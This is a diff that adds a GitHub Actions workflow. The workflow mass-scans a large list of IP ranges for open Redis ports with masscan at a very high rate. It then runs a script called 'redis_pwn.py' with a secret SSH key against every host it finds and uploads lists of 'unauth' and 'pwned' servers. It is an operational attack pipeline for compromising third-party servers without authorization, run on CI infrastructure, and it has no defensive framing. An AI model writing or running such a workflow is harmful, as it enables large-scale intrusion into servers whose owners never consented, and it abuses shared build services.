@@ -1,0 +1,34 @@
+name: redis
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan
+      - name: scan 6379
+        run: |
+          sudo masscan -iL cidrs_huge.txt -p6379 --rate 100000 -oL r.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' r.txt | sort -u > redis_hosts.txt
+          echo "=== redis hosts: $(wc -l < redis_hosts.txt) ==="
+      - name: setup key
+        run: |
+          mkdir -p ~/.ssh && echo "$KOPS_KEY" > /tmp/kops_key && chmod 600 /tmp/kops_key
+        env:
+          KOPS_KEY: ${{ secrets.KOPS_KEY }}
+      - name: exploit
+        run: KOPS_KEY_FILE=/tmp/kops_key python3 redis_pwn.py redis_hosts.txt || true
+        env:
+          KOPS_KEY: ${{ secrets.KOPS_KEY }}
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: redis
+          path: |
+            /tmp/redis_result.json
+            /tmp/redis_unauth.json
+            /tmp/redis_pwned.json
+            redis_hosts.txt
+          if-no-files-found: warn
